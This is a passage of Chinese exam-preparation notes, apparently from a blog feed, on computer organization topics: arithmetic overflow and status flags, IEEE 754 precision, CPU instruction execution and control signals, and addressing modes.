<li>机算 —- :red_circle:<strong>根据<code>OF</code>标志位判断，<code>OF</code> = <code>最⾼位产⽣的进位</code> 异或 <code>次⾼位产⽣的进位</code></strong></li>
<li>⼿算 —- 判断加减法的结果是否超出带符号数合法范围</li>
</ul>
</li>
</ul>
</li>
<li>IEEE754浮点数<ul>
<li>⼩题考察居多（可通过王道书课后⼩题复习）</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<ul>
<li><p><strong>乘法</strong></p>
<ul>
<li><p>无符号整数</p>
<ul>
<li><p>机算</p>
<ul>
<li><p>:flags:注意: 可用逻辑左移<code>&lt;&lt;</code>替代 <code>*2</code></p>
</li>
<li><p>:red_circle:溢出判断? </p>
<ul>
<li><p><code>n</code>位乘<code>n</code>位 若用<code>2n</code>位保存乘积,则不会溢出</p>
</li>
<li><p>n 位乘 <code>n</code> 位，⽤ <code>2n</code>位保存中间结果<br>最后截取末尾 <code>n</code> 位作为最终的乘积，可能会溢出</p>
<blockquote>
<ol>
<li>⼿算判溢出<ul>
<li>带⼊⼗进制计算乘法结果，判断该结果是否超出了 <code>n</code> 位“⽆符号数”所能表示的范围<br>若超出，则溢出</li>
</ul>
</li>
<li>机器判溢出<ul>
<li>两个⽆符号数乘法：<code>n</code> 位乘 <code>n</code> 位，⽤ <code>2n</code> 位保存中间结果。<br>仅当前<code>n</code>位都是<code>0</code>时，不溢出</li>
</ul>
</li>
</ol>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>带符号整数</p>
<ul>
<li><p>机算</p>
<ul>
<li><p>:flags:注意: 可用逻辑左移<code>&lt;&lt;</code>替代 <code>*2</code></p>
</li>
<li><p>:red_circle:溢出判断? </p>
<ul>
<li><p><code>n</code>位乘<code>n</code>位 若用<code>2n</code>位保存乘积,则不会溢出</p>
</li>
<li><p><code>n</code> 位乘 <code>n</code> 位，⽤ <code>2n</code>位保存中间结果<br>最后截取末尾 <code>n</code> 位作为最终的乘积，可能会溢出</p>
<blockquote>
<ol>
<li>⼿算判溢出<ul>
<li>带⼊⼗进制计算乘法结果，判断该结果是否超出了 <code>n</code> 位“⽆符号数”所能表示的范围<br>若超出，则溢出</li>
</ul>
</li>
<li>机器判溢出<ul>
<li>两个有符号补码乘法：<code>n</code> 位乘 <code>n</code> 位，⽤ <code>2n</code> 位保存中间结果。<pre><code>    仅当前 `n+1` 位全`1`或全`0`时，不溢出
</code></pre></li>
</ul>
</li>
</ol>
</blockquote>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<ul>
<li><p><strong>除法</strong></p>
<ul>
<li>⽆符号整数 <ul>
<li>机算 <ul>
<li>:flags:注意: 可用逻辑右移<code>&gt;&gt;</code>替代 <code>÷2</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li>⽆符号整数 <ul>
<li>机算<ul>
<li>:flags:注意: 可用逻辑右移<code>&gt;&gt;</code>替代 <code>÷2</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<hr>
<h2 id="常见的难点"><a href="#常见的难点" class="headerlink" title="常见的难点"></a>常见的难点</h2><ol>
<li>无符号数的加法, 减法怎么算?<ul>
<li>在硬件看来，对⽆符号数的加减法、对有符号补码的加减法都是⼀样的计算⽅法</li>
<li>加法：直接 <code>N bit</code>⼆进制按位相加</li>
<li>减法：计算 “<code>A - B</code>”，可转化为等价的加法——将 <code>B</code> 的 <code>N bit</code> 全部按位取反末位<code>+1</code>，然后与<code>A</code>相加</li>
</ul>
</li>
<li>遇到乘法怎么算?<ul>
<li>通常可带⼊⼗进制⼿算</li>
<li>408⼤纲不要求掌握浮点数乘法</li>
</ul>
</li>
<li>遇到除法怎么算?<ul>
<li>通常可带⼊⼗进制⼿算</li>
<li>408⼤纲不要求掌握浮点数除法</li>
</ul>
</li>
<li><p>溢出怎么判断?</p>
<ul>
<li><p>加法/减法</p>
<ul>
<li>手算判溢出<ul>
<li>带⼊⼗进制计算结果，判断该结果是否超出了 <code>n位</code>所能表示的范围，若超出，则溢出</li>
</ul>
</li>
<li><p>机器判溢出</p>
<ul>
<li>⽆符号数加/减：运算后若 <code>CF=1</code>，则溢出；若<code>CF=0</code>，则不溢出</li>
<li>有符号数补码加/减：运算后若 <code>OF=1</code>，则溢出；若<code>OF=0</code>，则不溢出</li>
</ul>
</li>
<li><p>乘法</p>
<ul>
<li><p><code>n</code>位乘<code>n</code>位 若用<code>2n</code>位保存乘积,则不会溢出</p>
</li>
<li><p><code>n</code> 位乘 <code>n</code> 位，⽤ <code>2n</code>位保存中间结果<br>最后截取末尾 <code>n</code> 位作为最终的乘积，可能会溢出</p>
<blockquote>
<ol>
<li>⼿算判溢出<ul>
<li>带⼊⼗进制计算乘法结果，判断该结果是否超出了 <code>n</code> 位“⽆符号数”所能表示的范围<br>若超出，则溢出</li>
</ul>
</li>
<li><p>机器判溢出</p>
<ul>
<li>两个⽆符号数乘法：<code>n</code> 位乘 <code>n</code> 位，⽤ <code>2n</code> 位保存中间结果。<br>仅当前<code>n</code>位都是<code>0</code>时，不溢出</li>
</ul>
</li>
</ol>
</blockquote>
<pre><code> - 两个有符号补码乘法：`n` 位乘 `n` 位，⽤ `2n` 位保存中间结果。
     仅当前 `n+1` 位全`1`或全`0`时，不溢出
</code></pre></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<pre><code>- 除法
  - 可能溢出，但是，整数的除法不可能溢出，只有⼩数的除法可能溢出
    ⽽408不要求掌握浮点数除法，因此不需太关注除法的溢出问题
</code></pre><ol>
<li><p>精度丢失怎么判断</p>
<ul>
<li><p>浮点数的精度：看尾数的位数</p>
<ol>
<li><p>单精度浮点型 <code>float</code>：尾数位数为 <code>23</code>+<code>1 bit</code>。因此</p>
<p>数值部分可以表示 <code>24bit</code>的精度</p>
</li>
<li><p>双精度浮点型 <code>double</code>：尾数位数为 <code>52</code>+<code>1 bit</code>。</p>
<p>因此数值部分可表示 <code>53bit</code>的精度</p>
</li>
<li><p>临时浮点数<code>long double</code>：尾数位数为 <code>64</code>+<code>1</code></p>
<p>bit。因此数值部分可表示 <code>65bit</code>的精度</p>
</li>
<li><p>注：<code>IEEE 754</code>标准中，尾数是规格化的，隐含了⼀个最⾼位的 <code>1</code></p>
</li>
</ol>
</li>
<li><p>定点整数的精度：看数值位的位数</p>
<ol>
<li><p>16位<code>short</code>型：数值部分的精度为<code>15 bit</code></p>
</li>
<li><p>32位<code>int</code>型：数值部分的精度为 <code>31 bit</code></p>
</li>
<li><p>32位<code>unsigned int</code> 型：数值部分的精度为 <code>32 bit</code></p>
</li>
<li><p>64位<code>long</code>型：数值部分的精度为<code>63 bit</code></p>
<blockquote>
<ul>
<li><p><strong>整数转浮点数：数值部分精度更⾼的类型，转为数值部分精度更低的类型，就有可能发⽣精度丢失</strong></p>
</li>
<li><p><strong>浮点数转整数：如果有浮点数有⼩数部分，则可能丢失精度</strong></p>
</li>
</ul>
</blockquote>
</li>
</ol>
</li>
</ul>
</li>
<li><p><code>CF</code>、<code>ZF</code>、<code>OF</code>、<code>SF</code> 傻傻分不清楚？</p>
<blockquote>
<ul>
<li><p><code>CF</code></p>
<ul>
<li><p>含义：进位/借位标志，表示⽆符号数的加减法是否发⽣了进位或借位。</p>
<p>当<code>CF=1</code>时，说明⽆符号数的加减运算发⽣了进位或借位，也即发⽣了溢出</p>
</li>
<li><p>硬件的计算⽅法：<code>CF</code> =<code>最⾼位产⽣的进位</code>⊕<code>sub</code></p>
<ul>
<li><code>sub = 1</code>表示减法</li>
<li><code>sub = 0</code>表示加分</li>
</ul>
</li>
<li><p>注意:  <code>CF</code>位对有符号数的加减法无意义</p>
</li>
</ul>
</li>
<li><p><code>ZF</code></p>
<ul>
<li>含义: 表示运算结果是否为0 <code>ZF=1</code>表示运算结果为<code>0</code>，<code>ZF=0</code>表示运算结果⾮<code>0</code></li>
<li>硬件的计算⽅法：两个数的运算结果为<code>n bit</code>，只有<code>n bit</code>全为<code>0</code>时，<code>ZF =1</code></li>
</ul>
</li>
<li><p><code>OF</code></p>
<ul>
<li>含义：有符号数的加减运算是否发⽣了溢出。<code>OF=1</code>时，说明发⽣了溢出</li>
<li>硬件的计算⽅法：<code>OF</code>=<code>最⾼位产⽣的进位</code>⊕ <code>次⾼位产⽣的进位</code></li>
<li>注意：<code>OF</code>位对⽆符号数的加减法⽆意义</li>
</ul>
</li>
<li><p><code>SF</code></p>
<ul>
<li>含义：有符号数加减运算结果的正负性，<code>SF=0</code>表示运算结果为正数，<code>SF=1</code>表示运算结果为负数</li>
<li>硬件的计算⽅法：<code>SF =</code> 最⾼位的本位和</li>
<li>注意：<code>SF</code>位对⽆符号数的加减法⽆意义</li>
</ul>
</li>
</ul>
</blockquote>
</li>
</ol>
<hr>
<h2 id="大纲要求"><a href="#大纲要求" class="headerlink" title="大纲要求"></a>大纲要求</h2><ul>
<li><p>（⼀）数制与编码</p>
<ol>
<li><p><strong>进位计数制及其相互转换</strong></p>
<ul>
<li>二进制</li>
<li>八进制</li>
<li>十进制</li>
<li>十六进制</li>
</ul>
<blockquote>
<ul>
<li>相互转换<ul>
<li>⼆、⼋、⼗六 之间的转换很简单</li>
<li>⼆转⼗  <ul>
<li>根据每位权值展开即可</li>
</ul>
</li>
<li>⼗转⼆<ul>
<li>好拼凑的<ul>
<li>拼凑法（熟悉每个⼆进制位的权重）</li>
</ul>
</li>
<li>不好平凑的<ul>
<li>整数部分：除2留余数，先留是低位后留是⾼位</li>
<li>⼩数部分：乘2取整，先取是⾼位后取是低位</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
</li>
</ol>
</li>
</ul>
<ol>
<li><p><strong>定点数的编码表示</strong></p>
<ul>
<li><p>:flags:无符号数的表示</p>
<ul>
<li>重点关注⽆符号数的“减法”如何实现，以及⽆符号数加法/减法的溢出判断</li>
</ul>
</li>
<li><p>带符号整数的表示</p>
<ul>
<li>[ ] 原</li>
<li>[ ] 反</li>
<li>[x] 补<ul>
<li>重点关注补码的“减法”如何实现，以及补码加法/减法的溢出判断</li>
</ul>
</li>
<li>[ ] 移<ul>
<li>注意偏移量是多少</li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>把符号位和数值位⼀起编码的⽅法</strong></p>
</blockquote>
</li>
</ul>
</li>
</ol>
<hr>
<ul>
<li><p>（⼆） 运算⽅法和运算电路</p>
<ol>
<li><p>基本运算部件</p>
<ul>
<li><p>加法器</p>
</li>
<li><p>算数逻辑部件（<code>ALU</code>）</p>
</li>
</ul>
</li>
<li><p>加/减运算</p>
<ul>
<li>补码加/减运算器</li>
<li>标志位的⽣成<ul>
<li><code>CF</code>、<code>SF</code>、<code>ZF</code>、<code>OF</code></li>
</ul>
</li>
</ul>
</li>
<li><p>乘/除运算</p>
</li>
</ol>
</li>
</ul>
<hr>
<ul>
<li>（三）整数的表示和运算<ol>
<li>⽆符号整数的表示和运算<ul>
<li>表示</li>
<li>运算<ul>
<li>加、减、乘、除</li>
<li>溢出判断</li>
</ul>
</li>
</ul>
</li>
<li>带符号整数的表示和运算<ul>
<li>表示<ul>
<li>原、反、补、移</li>
</ul>
</li>
<li>运算（仅关注补码即可）<ul>
<li>加、减、乘、除</li>
<li>溢出判断</li>
</ul>
</li>
</ul>
</li>
</ol>
</li>
</ul>
<hr>
<ul>
<li><p>（四）整浮点数的表示和运算</p>
<ol>
<li><p>浮点数的表示： <code>IEEE754</code> 标准</p>
<ul>
<li>结构：符号位+阶码+尾数<ul>
<li><code>float</code>：<code>1+8+23</code></li>
<li><code>double</code>：<code>1+11+52</code></li>
<li><code>long double</code>：<code>1+15+64</code></li>
</ul>
</li>
</ul>
</li>
<li><p>浮点数的加/减运算</p>
<ul>
<li><p>对阶：⼩阶向⼤阶对⻬</p>
</li>
<li><p>尾数加减：原码定点数的加减法</p>
<ul>
<li><p>规格化：尾数规格化为 <code>1.xxxxx</code>的形式</p>
<ul>
<li><p>尾数每左规⼀位，阶码 <code>- 1</code></p>
</li>
<li><p>尾数每右规⼀位，阶码 <code>+ 1</code></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>舍⼊：尾数右规时，可能导致精度丢失，需考虑舍⼊问题</p>
</li>
<li><p>判溢出</p>
<ul>
<li><p>尾数右规时，阶码超出可表示的最⼤值，上溢 </p>
<ul>
<li>[x] 发⽣溢出异常</li>
</ul>
</li>
<li><p>尾数左规时，阶码低于可表示的最⼩值，下溢 </p>
<ul>
<li>[x] 当做机器0处理</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol>
</li>
</ul>
<hr>
]]></content>
      <categories>
        <category>408</category>
      </categories>
      <tags>
        <tag>408</tag>
        <tag>计算机组成原理</tag>
      </tags>
  </entry>
  <entry>
    <title>一条指令的硬件实现的思维导图</title>
    <url>/2024/08/10/Study/408-p5/</url>
    <content><![CDATA[<h1 id="一条指令的硬件实现"><a href="#一条指令的硬件实现" class="headerlink" title="一条指令的硬件实现"></a>一条指令的硬件实现</h1><h2 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h2><h3 id="Ch5-中央处理器-CPU"><a href="#Ch5-中央处理器-CPU" class="headerlink" title="Ch5 中央处理器(CPU)"></a>Ch5 中央处理器(CPU)</h3><h4 id="一-CPU的功能和结构"><a href="#一-CPU的功能和结构" class="headerlink" title="(一) CPU的功能和结构"></a>(一) CPU的功能和结构</h4><ul>
<li><p>CPU =  控制器 + 数据通路 </p>
<blockquote>
<ul>
<li>控制器, 即<code>CU</code>, 是指令的控制部件</li>
<li>数据通路, 是指令的执行部件,包括运算器,寄存器,数据传输的线路等</li>
</ul>
</blockquote>
</li>
</ul>
<hr>
<h4 id="二-指令执行过程"><a href="#二-指令执行过程" class="headerlink" title="(二)指令执行过程"></a>(二)指令执行过程</h4><ul>
<li><p>取指 译码 </p>
<blockquote>
<ul>
<li>取指令<code>IR</code>, <code>PC + “1”</code></li>
<li><code>CU</code>根据指令<code>IR</code>译码, 确定指令的执行时序</li>
</ul>
</blockquote>
</li>
<li><p>执行</p>
<blockquote>
<ul>
<li>取操作数, 运算, 存结果</li>
<li>异常/中断的检测与处理(如果有的话)</li>
</ul>
</blockquote>
</li>
</ul>
<hr>
<h4 id="三-数据通路的功能和基本结构"><a href="#三-数据通路的功能和基本结构" class="headerlink" title="(三) 数据通路的功能和基本结构"></a>(三) 数据通路的功能和基本结构</h4><hr>
<h4 id="四-控制器的功能和工作原理"><a href="#四-控制器的功能和工作原理" class="headerlink" title="(四) 控制器的功能和工作原理"></a>(四) 控制器的功能和工作原理</h4><ul>
<li><ol>
<li>硬布线控制器</li>
</ol>
</li>
<li><ol>
<li>微程序控制器</li>
</ol>
</li>
</ul>
<blockquote>
<p> 2022大纲更新后考察权重被弱化</p>
</blockquote>
<hr>
<h4 id="五-异常和中断机制"><a href="#五-异常和中断机制" class="headerlink" title="(五) 异常和中断机制"></a>(五) 异常和中断机制</h4><ul>
<li><ol>
<li>异常和中断的基本概念</li>
</ol>
</li>
<li><ol>
<li>异常和中断的分类</li>
</ol>
</li>
<li><ol>
<li>异常和中断的检测与响应<blockquote>
<ul>
<li><p>:large_blue_circle: 软件识别（<code>MIPS</code>采⽤） </p>
<ol>
<li>CPU内部设置⼀个“异常状态寄存器”，⽤于保存异常原因。</li>
<li>检测到异常/中断后，固定跳转到⼀个异常处理（⼊⼝）程序，<br>由它判断“异常状态寄存器”的值，再决定要跳转到⼀个具体的异常/中断处理程序</li>
</ol>
</li>
<li><p>:large_blue_circle: 硬件识别（<code>x86</code>采⽤）</p>
<ol>
<li>每个异常/中断都有⼀个中断号，硬件根据中断</li>
</ol>
<p>号，找到中断向量，并跳转⾄对应的异常/中断处</p>
<p>理程序</p>
</li>
</ul>
</blockquote>
</li>
</ol>
</li>
</ul>
<h4 id="六-指令流⽔线"><a href="#六-指令流⽔线" class="headerlink" title="(六) 指令流⽔线"></a>(六) 指令流⽔线</h4><ol>
<li>指令流⽔线的基本概念</li>
<li>指令流⽔线的基本实现</li>
<li>结构冒险、数据冒险、控制冒险的处理</li>
<li>超标量和动态流⽔线的基本概念</li>
</ol>
<hr>
<h4 id="七-多处理器基本概念"><a href="#七-多处理器基本概念" class="headerlink" title="(七) 多处理器基本概念"></a>(七) 多处理器基本概念</h4><ol>
<li><code>SISD</code>、<code>SIMD</code>、<code>MIMD</code>、向量处理器的基本概<br>念</li>
<li>硬件多线程的基本概念</li>
<li>多核处理器（multi-core）的基本概念</li>
<li>共享内存多处理器（SMP）的基本概念</li>
</ol>
<hr>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h4 id="分析框架-——-⼀条指令的执⾏过程"><a href="#分析框架-——-⼀条指令的执⾏过程" class="headerlink" title="分析框架  —— ⼀条指令的执⾏过程"></a>分析框架  —— ⼀条指令的执⾏过程</h4><ul>
<li><p>①取指阶段（所有指令在取指阶段做的事情都⼀样）</p>
<ul>
<li>②执⾏阶段（根据指令类别来思考）<ul>
<li>数据传送类指令（如：<code>mov</code>、<code>load</code>、<code>store</code>）</li>
<li>运算类指令（如：<code>加</code>、<code>减</code>、<code>乘</code>、<code>除</code>、<code>移位</code>、<code>与</code>、<code>或</code>）</li>
<li>转移类指令（如：<code>jmp</code>、<code>jxxx</code>）</li>
</ul>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>参⻅“直播⼿稿”</p>
</blockquote>
<hr>
<h4 id="如何⽤硬件实现指令功能？"><a href="#如何⽤硬件实现指令功能？" class="headerlink" title="如何⽤硬件实现指令功能？"></a>如何⽤硬件实现指令功能？</h4><ul>
<li><p><code>Key</code>：指令的功能，要⽤什么硬件部件实现？数据应该如何流动？——硬件的控制信号、连线只是实现逻辑</p>
<p>的⼀种外化体现。</p>
</li>
<li><p>控制硬件的信号</p>
<ul>
<li><code>XXXin</code> 允许数据进⼊</li>
<li><code>XXXout</code> 允许数据出去</li>
<li><code>XXXop</code> 具体的控制信号</li>
</ul>
</li>
<li><p>常⻅硬件</p>
<ol>
<li><p>操作元件（组合逻辑元件）</p>
<blockquote>
<ul>
<li><p>三态⻔</p>
<ul>
<li>就是⼀道⻔，可开可关<ul>
<li>控制信号：<code>1 bit</code>，⽤于控制<code>开/关</code></li>
</ul>
</li>
</ul>
</li>
<li><p>加法器（<code>Adder</code>）</p>
<ul>
<li>结合第⼆章复习，相当于弱鸡版ALU，只能实现加法、减法控制信号：<code>1 bit</code> <ul>
<li><code>0</code>加<code>1</code>减，控制信号的值会影响 <code>CF</code></li>
</ul>
</li>
</ul>
<ul>
<li><p>算术逻辑单元（<code>ALU</code>）</p>
<ul>
<li><p>实现加减乘除等算数运算、与或⾮等逻辑运算</p>
</li>
<li><p>控制信号：<code>n bit</code>，取决于<code>ALU</code>⽀持多少种运算，<code>`n bit</code>控制信号，对应 $2^n$ 种运算</p>
</li>
</ul>
</li>
<li><p>多路选择器（<code>MUX</code>）</p>
<ul>
<li><p>有多路输⼊，通过控制信号来选择让其中的某条输⼊通路被打开</p>
</li>
<li><p>控制信号：<code>n bit</code>，取决于有多少路输⼊，<code>n bit</code>控制信号，对应 $2^n$ 路</p>
</li>
</ul>
</li>
<li><p>译码器（<code>Decoder</code>）</p>
<ul>
<li><p>根据 <code>n bit</code> 控制信号选择将 $2^n$ 条输出线路中的某⼀条信号选通为<code>1</code></p>
</li>
<li><p>控制信号：<code>n bit</code>。由译码器的 <code>n bit</code>输⼊即可决定选通哪根</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
</li>
<li><p>存储元件（时序逻辑元件）</p>
<blockquote>
<ul>
<li><p>普通寄存器</p>
<ul>
<li>关注具有特定⽤途的寄存器：<code>MAR</code>、<code>MDR</code>、<code>IR</code>、<code>PC</code>、<code>FR</code>（即标志寄存器，有的系统中称为<code>PSW</code>）</li>
<li>控制信号：允许读、允许写</li>
</ul>
</li>
<li><p>暂存寄存器</p>
<ul>
<li>通常会在单总线结构中和<code>ALU</code>配合使⽤</li>
<li>控制信号：允许读、允许写</li>
</ul>
</li>
<li><p>通⽤寄存器组</p>
<ul>
<li><p>控制信号1：允许读、允许写</p>
</li>
<li><p>控制信号2：若通⽤寄存器组共有 $2^n$ 个寄存器，则需要<code>n bit</code>控制信号选择其中⼀个寄存器</p>
</li>
</ul>
</li>
</ul>
</blockquote>
<p> ==注意：有的寄存器可能⽀持特殊功能==</p>
<blockquote>
<ul>
<li><p>带“移位功能”的寄存器</p>
<ul>
<li><p>可以实现移位运算（算数左移/右移、逻辑左移/右移）</p>
</li>
<li><p>隐藏技能：⽤移位运算等价实现 “乘/除 $2^n$”</p>
</li>
</ul>
</li>
<li><p>带“⾃增、⾃减功能”的寄存器</p>
<ul>
<li><p>可实现寄存器的值<code>++</code>、<code>--</code></p>
</li>
<li><p>常⻅⽤途：有的<code>PC</code>寄存器带有⾃增功能</p>
</li>
<li><p>带其他特殊功能的寄存器</p>
<ol>
<li>带“符号扩展”功能的寄存器</li>
</ol>
<ul>
<li>可以将位数短的带符号数（补码）扩展为位数更⻓的带符号数（补码）</li>
</ul>
</li>
</ul>
<ol>
<li>带“零扩展”功能的寄存器<ul>
<li>可以将位数短的⽆符号数扩展为位数更⻓的⽆符号数</li>
</ul>
</li>
</ol>
</li>
</ul>
<ol>
<li>带“取反功能”的寄存器 <ul>
<li>可以实现全部位按位取反</li>
</ul>
</li>
</ol>
</blockquote>
</li>
</ol>
</li>
</ul>
<hr>
<h4 id="如何看懂“注释”"><a href="#如何看懂“注释”" class="headerlink" title="如何看懂“注释”"></a>如何看懂“注释”</h4><ol>
<li>袁版注释⻛格（16年以后的真题）<ul>
<li>数据在通⽤寄存器组<ul>
<li>特点：⽤<code>R[i]</code>表示，中括号内为寄存器编号</li>
<li>eg：<code>R[6]×R[3]→R[2]</code>。将寄存器<code>R6</code>×<code>R3</code>的内容写⼊<code>R2</code></li>
</ul>
</li>
</ul>
</li>
</ol>
<ul>
<li><p>数据在某个特殊名字的寄存器</p>
<ul>
<li>特点：直接⽤寄存器名字表示</li>
<li>eg：<code>R[6]+10→PC</code>。把寄存器<code>R6+10</code>的内容写⼊<code>PC</code></li>
<li>eg：<code>MDR→PC</code>。把<code>MDR</code>的内容写⼊<code>PC</code></li>
</ul>
</li>
</ul>
<ul>
<li><p>数据在主存</p>
<ul>
<li>特点：⽤<code>M[addr]</code>表示，<code>addr</code>为主存地址</li>
<li>eg：<code>R[6]→M[10086]</code>   将<code>R6</code>的内容存⼊主存地址<code>10086</code></li>
<li>eg：<code>R[3]&lt;&lt;2→M[R[6]]</code>  将R3进⾏“左移两位”运算，并将结果存⼊<code>R6</code>所指的主存地址（寄存器间接寻址）</li>
<li>eg：<code>M[PC+10]→MDR</code> 将 <code>PC+10</code>指向的主存内容取到<code>MDR</code></li>
</ul>
</li>
</ul>
<ul>
<li><p>特点总结</p>
<ul>
<li><p>喜欢⽤“中括号”，中括号⾥边表示寄存器编号、或主存地址</p>
</li>
<li><p>要使⽤寄存器⾥的内容，不⽤加⼩括号，直接给寄存器名即可</p>
</li>
</ul>
</li>
</ul>
<ol>
<li>唐版注释⻛格（16年以前的真题）<ul>
<li>数据在通⽤寄存器组<ul>
<li>特点：箭头左边，⽤寄存器名加⼩括号，表示寄存器⾥的值；箭头右边表示存⼊某个寄存器不加⼩括号</li>
<li>eg：<code>(R6)×(R3)→R2</code>。将寄存器<code>R6</code>×<code>R3</code>的内容写⼊<code>R2</code></li>
</ul>
</li>
</ul>
</li>
</ol>
<ul>
<li><p>数据在某个特殊名字的寄存器</p>
<ul>
<li>特点：特点：直接⽤寄存器名字表示，要使⽤寄存器⾥的值需要加⼩括号</li>
<li>eg：<code>(R6)+10→PC</code>。把寄存器<code>R6+10</code>的内容写⼊<code>PC</code></li>
<li>eg：<code>(MDR)→PC</code>。把<code>MDR</code>的内容写⼊<code>PC</code></li>
</ul>
</li>
</ul>
<ul>
<li><p>数据在主存</p>
<ul>
<li>特点：⽤<code>M(addr)</code>表示，<code>addr</code>为主存地址</li>
<li>eg：<code>R(6)→M(10086)</code>   将<code>R6</code>的内容存⼊主存地址<code>10086</code></li>
<li>eg：<code>R(3)&lt;&lt;2→M((R(6))</code>  将R3进⾏“左移两位”运算，并将结果存⼊<code>R6</code>所指的主存地址（寄存器间接寻址）</li>
<li>eg：<code>((PC)+10)→MDR</code> <ul>
<li>将 <code>PC+10</code>指向的主存内容取到<code>MDR</code><ul>
<li>在箭头的左边表示“访问主存”时，可以不加M，⽤两层括号表示寄存器间接寻址</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>特点总结</p>
<ul>
<li><p>喜欢⽤“小括号”</p>
</li>
<li><p>箭头左边若要使⽤某个寄存器⾥的内容，必须在寄存器名字外⾯加⼩括号</p>
</li>
<li>箭头右边表示存⼊某个寄存器，不⽤加⼩括号</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>408</category>
      </categories>
      <tags>
        <tag>408</tag>
        <tag>计算机组成原理</tag>
      </tags>
  </entry>
  <entry>
    <title>一堆指令的执行思维导图</title>
    <url>/2024/08/10/Study/408-p4/</url>
    <content><![CDATA[<h1 id="一堆指令的执行"><a href="#一堆指令的执行" class="headerlink" title="一堆指令的执行"></a>一堆指令的执行</h1><h2 id="大纲-CH4指令系统"><a href="#大纲-CH4指令系统" class="headerlink" title="大纲 - CH4指令系统"></a><strong>大纲 - CH4指令系统</strong></h2><h4 id="（一）指令系统的基本概念"><a href="#（一）指令系统的基本概念" class="headerlink" title="（一）指令系统的基本概念"></a>（一）指令系统的基本概念</h4><hr>
<h4 id="（二）指令格式"><a href="#（二）指令格式" class="headerlink" title="（二）指令格式"></a>（二）指令格式</h4><ol>
<li><p>指令的基本格式</p>
<ul>
<li><p>操作码 —— 指明了动作</p>
</li>
<li><p>操作数（可能有<code>0 ~ n</code>个）</p>
</li>
<li><p>寻址方式 —— 怎么找到这个操作数？</p>
<ul>
<li>形式地址<blockquote>
<ul>
<li><strong>形式地址（需转成有效地址EA）</strong></li>
<li><strong>指令运行时需转成有效地址EA     </strong> </li>
</ul>
</blockquote>
</li>
</ul>
</li>
<li><p>根据指令长度是否固定不变，分为两类</p>
<blockquote>
<ul>
<li><strong>定长指令字  —— 每次PC + “1”， “1”固定</strong></li>
<li><strong>变长指令字  —— 每次PC + “1”， “1”不固定</strong></li>
</ul>
</blockquote>
</li>
</ul>
</li>
<li><p>定长操作码指令格式  —— 操作码的位数固定不变</p>
</li>
<li><p>扩展操作码指令格式  —— 操作码的位数可能会改变</p>
</li>
</ol>
<hr>
<h4 id="（三）寻址方式"><a href="#（三）寻址方式" class="headerlink" title="（三）寻址方式"></a>（三）寻址方式</h4><ol>
<li><p>有效地址的概念 EA: 最重要的访问的地址 </p>
</li>
<li><p>要寻找什么</p>
<blockquote>
<ul>
<li><strong>数据寻址：找数据 —— 找到你要操作的数据</strong></li>
<li><strong>指令寻址：找吓一跳要执行的指令 —— 影响PC的值</strong></li>
</ul>
</blockquote>
</li>
<li><p>常见的寻址方式 —— </p>
</li>
</ol>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">寻址方式</th>
<th style="text-align:center">有效地址</th>
<th style="text-align:center">访存次数（指令执行期间）</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">隐含寻址</td>
<td style="text-align:center">程序指定</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">立即寻址</td>
<td style="text-align:center">A即是操作数</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">直接寻址</td>
<td style="text-align:center">EA = A</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">一次间接寻址</td>
<td style="text-align:center">EA = (A)</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:center">寄存器寻址</td>
<td style="text-align:center">EA = R</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">寄存器间接一次寻址</td>
<td style="text-align:center">EA = (R)</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">相对寻址</td>
<td style="text-align:center">EA = (PC) + A</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">基址寻址</td>
<td style="text-align:center">EA = (BR) + A</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">变址寻址</td>
<td style="text-align:center">EA = (DC) + A</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">堆栈寻址</td>
<td style="text-align:center">入栈出栈时EA的确定方式不同</td>
<td style="text-align:center">硬堆栈不访存<br>软堆栈访存1次</td>
</tr>
</tbody>
</table>
</div>
<h4 id="（四）数据的对齐和大-小端存放方式"><a href="#（四）数据的对齐和大-小端存放方式" class="headerlink" title="（四）数据的对齐和大/小端存放方式"></a>（四）数据的对齐和大/小端存放方式</h4><ul>
<li><p>数据的对齐</p>
<ul>
<li><strong>按边界对齐</strong></li>
<li><strong>不按边界对齐</strong></li>
</ul>
</li>
<li><p>存放方式</p>
<ul>
<li><strong>大端存储（更符合人类的视角）</strong></li>
<li><strong>小端存储</strong></li>
</ul>
</li>
</ul>
<hr>
<h4 id="（五）CISC和RISC的基本概念"><a href="#（五）CISC和RISC的基本概念" class="headerlink" title="（五）CISC和RISC的基本概念"></a>（五）CISC和RISC的基本概念</h4><ul>
<li>从机器级代码中可以看到的显著区别<ul>
<li>指令字是否定长？</li>
<li>除了Load, Store 之外，是否还有其他可以指令访存？</li>
</ul>
</li>
</ul>
<hr>
